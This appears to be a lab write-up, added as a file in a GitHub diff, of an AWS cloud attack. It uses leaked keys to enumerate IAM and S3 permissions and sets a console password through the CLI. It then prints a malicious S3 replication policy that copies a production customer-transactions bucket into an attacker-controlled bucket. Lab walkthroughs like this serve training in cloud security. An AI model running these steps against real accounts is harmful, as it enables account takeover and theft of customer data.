@@ -1,0 +1,95 @@
+
+#Let's start with provided credentials
+#Access key ID :<ACCESS_KEY>Secret access key :<SECRET_KEY> 
+~aws configure
+
+#Use command below to reveal account ID and user name
+~aws sts get-caller-identity
+
+#Create enumerator command to globally runnable from your terminal
+~go install -v github.com/shabarkin/aws-enumerator@latest
+
+#Then we need to set the AWS credentials for the tool with the following command. Note that this creates a .env file in the current directory with the keys in plain text
+~go/bin/aws-enumerator cred -aws_access_key_id <access-key-id> -aws_region us-west-2 -aws_secret_access_key <secret-access-key>
+
+#Okay, let's try to brute force our IAM permission
+~go/bin/aws-enumerator enum -services all
+
+#In this case, we'll have access to IAM and S3
+#Using the dump action we're able to list the specific permissions we have to IAM and S3
+~go/bin/aws-enumerator dump -services iam,s3
+
+#Results will pop up ListRoles,ListPolicies for IAM and ListBuckets for S3
+#It's time to see if our compromised user is able to set their own AWS console password from the CLI. In this case it works!
+~aws iam update-login-profile --user-name <USER_NAME> --password <PASSWORD>
+
+#Now we are able to use all the credentials to log in to the aws console and head to S3 bucket
+#We have 3 buckets cust-txn-prod-36b11aedf688, cust-txn-replica-36b11aedf688, s3-secure-backup-36b11aedf688
+#The secure backup bucket doesn't contain any files, but this confirms that we have the ListBucket permission on the bucket
+#Try to upload and download a file onto and from this bucket it is successful, which means we have PutObject and GetObject permission
+#Checking the cust-txn-prod (which we assume means customer transactions in the prod environment), we get an error. We don't have the ListBucket permission on the bucket. This bucket is a high value target
+#The same goes for the replica bucket (in our case named cust-txn-replica-36b11aedf688)
+#We can use any file to test with to see if we can upload anything into the buckets
+~wget <FILE_NAME>.pdf
+
+#We just uploaded successfully a file onto the prod bucket
+#Note: We also can't download anything from the prod bucket when trying
+~aws s3 cp s3://cust-txn-prod-36b11aedf688/<FILE_NAME>.pdf
+
+#However, we can write and have GetObject on the repl bucket
+~aws s3 cp <FILE_NAME>.pdf s3://cust-txn-replica-36b11aedf688
+~aws s3 cp s3://cust-txn-replica-36b11aedf688/<FILE_NAME>.pdf .
+
+-->The customer-managed IAM policies indicate that S3 replication and batch operations are in use, with batch operations handling tasks like copying files created before replication was enabled, while the replication configuration with the associated IAM role manages ongoing replication; modifying the replication configuration could allow redirecting files to a malicious backup bucket, posing a security risk.
+#From now on, we can just work on the console
+#Replace the default policy in the repl bucket by the malicous policy below to exfiltrate new S3 objects in an attack
+{
+    "Statement": [
+        {
+            "Action": [
+                "s3:ListBucket",
+                "s3:GetReplicationConfiguration",
+                "s3:GetObjectVersionTagging",
+                "s3:GetObjectVersionForReplication",
+                "s3:GetObjectVersionAcl",
+                "s3:GetObjectRetention",
+                "s3:GetObjectLegalHold"
+            ],
+            "Effect": "Allow",
+            "Resource": [
+                "arn:aws:s3:::s3-secure-backup-36b11aedf688/*",
+                "arn:aws:s3:::s3-secure-backup-36b11aedf688",
+                "arn:aws:s3:::cust-txn-prod-36b11aedf688/*",
+                "arn:aws:s3:::cust-txn-prod-36b11aedf688"
+            ]
+        },
+        {
+            "Action": [
+                "s3:ReplicateTags",
+                "s3:ReplicateObject",
+                "s3:ReplicateDelete",
+                "s3:ObjectOwnerOverrideToBucketOwner"
+            ],
+            "Effect": "Allow",
+            "Resource": [
+                "arn:aws:s3:::s3-secure-backup-36b11aedf688/*",
+                "arn:aws:s3:::cust-txn-prod-36b11aedf688/*"
+            ]
+        }
+    ],
+    "Version": "2012-10-17"
+}
+#Now the secure backup bucket that we have full permissions to as the replication destination
+#We upload a new test file to the prod bucket, that gets automatically replicated to our secure backup bucket!
+~mv <FILE_NAME>.pdf <NEW_FILE_NAME>.pdf
+~aws s3 cp <NEW_FILE_NAME>.pdf s3://cust-txn-prod-36b11aedf688
+~aws s3 ls s3://s3-secure-backup-36b11aedf688
+
+-->Any new sensitive info will be replicated from the prod bucket to our bucket!
+
+
+
+
+
+
+New File at / · Phuodiep0510/AWS-project
